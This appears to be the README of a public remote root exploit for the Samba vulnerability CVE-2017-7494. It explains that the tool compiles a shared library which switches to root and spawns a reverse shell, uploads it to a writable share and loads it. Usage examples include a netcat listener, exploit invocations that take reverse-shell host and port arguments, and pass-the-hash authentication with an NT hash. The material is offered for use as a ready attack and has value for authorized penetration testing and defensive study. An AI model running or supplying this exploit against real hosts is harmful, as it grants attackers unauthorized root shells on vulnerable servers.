# CVE-2017-7494

Remote root exploit for the SAMBA CVE-2017-7494 vulnerability.

Now with Pass-the-Hash feature!

## Details

This exploit is divided in 2 parts:

 * First, it compiles a payload called "implant.c" and generates a library (libimplantx32.so or libimplantx64.so) that changes to the root user, detaches from the parent process and spawns a reverse shell.
 * Second, it finds a writeable share in the specified target host, uploads the library with a random name and tries to load it.

As long as the target is vulnerable and the payload is the correct for the target operating system and architecture, the exploit is 100% reliable.

## How to

In your machine, run the following command:

```
$ nc -p 60321 -l
```
Then, run the exploit against your target and wait until it connects back to your Netcat:
```
$ python cve_2017_7494.py -r RHOST
```
```
$ python cve_2017_7494.py -r RHOST -u userTest -P 123 --lhost RevShellIP --lport RevShellPort 
```

Run your own custom .so
```
$ python cve_2017_7494.py -r 172.28.215.180 -u m4ud --hashes 00000000000000000000000000000000:3DBDE697D71690A769204BEB12283678 -c cp.so
```
For custom samba port use the argument -p
```
$ python cve_2017_7494.py -t target_ip -p 139 -u test -P 123456 --rhost shell_ip --rport shell_port -n 1
```
In case you bump into smbpasswd hashes and can not crack them, You can now you pass-the-hash using the argument --hashes=LM:NT
```
$ python cve_2017_7494.py -r RHOST -u userTest --hashes=00000000000000000000000000000000:3DBDE697D71690A769204BEB12283678 --lhost RevShellIP
```
